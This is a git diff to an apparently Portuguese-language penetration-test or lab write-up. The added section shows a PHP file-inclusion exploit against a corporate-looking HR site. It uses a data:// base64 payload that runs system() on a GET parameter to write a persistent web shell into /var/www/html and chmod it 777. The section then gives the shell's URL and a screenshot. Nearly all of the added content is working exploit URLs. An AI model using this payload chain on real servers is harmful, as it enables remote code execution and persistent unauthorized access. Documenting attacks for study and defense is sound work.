@@ -159,6 +159,17 @@ Contato: calazanscybersec@gmail.com" > hacked_by_luan.txt
 
 ```
 
+- Criação do arquivo de prompt comando no caminho : /var/www/html
+```
+  http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=echo%20'%3C?php%20echo%20%22%3Cform%20method%3DGET%3E%3Cinput%20type%3Dtext%20name%3Dcmd%20placeholder%3DDigite%20um%20comando%3E%3Cinput%20type%3Dsubmit%20value%3DExecutar%3E%3C/form%3E%3Cpre%3E%22%3B%20if(isset(%24_GET%5B%22cmd%22%5D))%20%7B%20system(%24_GET%5B%22cmd%22%5D)%3B%20%7D%20echo%20%22%3C/pre%3E%22%3B%20%3F%3E'%20%3E%20/var/www/html/web_shell.php
+
+permissão: http://rh.businesscorp.com.br/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=chmod%20777%20/var/www/html/web_shell.php
+
+caminho : http://rh.businesscorp.com.br/web_shell.php
+
+```
+<img width="526" height="442" alt="image" src="https://github.com/user-attachments/assets/14fc622f-5f4d-4596-862b-21f8bb10184a" />
+
 
 ---
 
